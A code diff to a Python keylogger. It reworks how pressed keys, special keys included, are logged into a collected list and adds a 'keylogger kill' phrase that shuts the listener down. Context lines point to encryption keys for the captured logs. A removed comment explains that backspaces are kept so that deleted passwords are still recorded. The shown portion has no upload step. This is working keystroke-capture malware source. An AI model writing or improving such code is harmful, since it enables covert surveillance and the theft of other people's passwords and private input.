@@ -29,6 +29,9 @@ collected_keys = [] # list to store the accumulated key logs
 countdown_active = False # flag to indicate if the countdown thread is running
 initial_log_time = None # current batch start timestamp
 last_keypress_time = None # last input timestamp (initialized to None, will be set on first keypress)
+KILL_SWITCH_PHRASE = "keylogger kill"
+kill_buffer = [] # buffer to check for the kill switch phrase
+MAX_KILL_BUFFER_LEN = len(KILL_SWITCH_PHRASE)
 SYMMETRIC_KEY = None
 PUBLIC_KEY_PEM = None
 
@@ -119,31 +122,39 @@ def on_press(key):
 
     try:
         char = key.char
+        char_to_log = char
         print(char, end='', flush=True) 
-        collected_keys.append(char) # add the recorded character to the list
 
     except AttributeError:
-        # handle special keys i.e. Space, Enter, Shift, Ctrl, Alt
+        # Handle special keys i.e. Space, Enter, Shift, Ctrl, Alt
         if key == keyboard.Key.space:
-            special_key_repr = " "
+            char_to_log = " "
         elif key == keyboard.Key.enter:
-            special_key_repr = "\n" # add newline for readability
+            char_to_log = "\n" # Add newline for readability
         elif key == keyboard.Key.tab:
-            special_key_repr = "\t"
+            char_to_log = "\t"
         elif key == keyboard.Key.backspace:
-            # backspace is added rather than removing the previous characters to maintain the log integrity
-            # if a user were to enter a password for something like google docs and then backspace within the doc, it would delete the password
-            # i think tracking backspaces separately would be the most effective logging method
-            special_key_repr = "[BACKSPACE]"
+            char_to_log = "[BACKSPACE]"
         else:
-            # for other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
-            special_key_repr = f"[{str(key).replace('Key.', '').upper()}]"
+            # For other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
+            char_to_log = f"[{str(key).replace('Key.', '').upper()}]"
         
-        print(special_key_repr, end='', flush=True)
-        collected_keys.append(special_key_repr) # add the recorded special character to the list
+        print(char_to_log, end='', flush=True)
+    
+    # Add keypress and window title info to collected_keys
+    collected_keys.append(char_to_log)
     
     # update the time of the last key press
     last_keypress_time = time.time()
+
+    # kill switch logic, failsafe deactivation method to simplify usage and ensure it can be triggered by the user
+    kill_buffer.append(char_to_log.lower()) # case insenitively document the collection of pressed keys
+    if len(kill_buffer) > MAX_KILL_BUFFER_LEN:
+        kill_buffer.pop(0)
+
+    if "".join(kill_buffer) == KILL_SWITCH_PHRASE:
+        print(f"\nKill switch phrase '{KILL_SWITCH_PHRASE}' detected. Shutting down keylogger.")
+        return False # stop the listener and exit the program
     
     # start the countdown thread only if it's not already active and after the first keypress has set last_keypress_time.
     if not countdown_active:
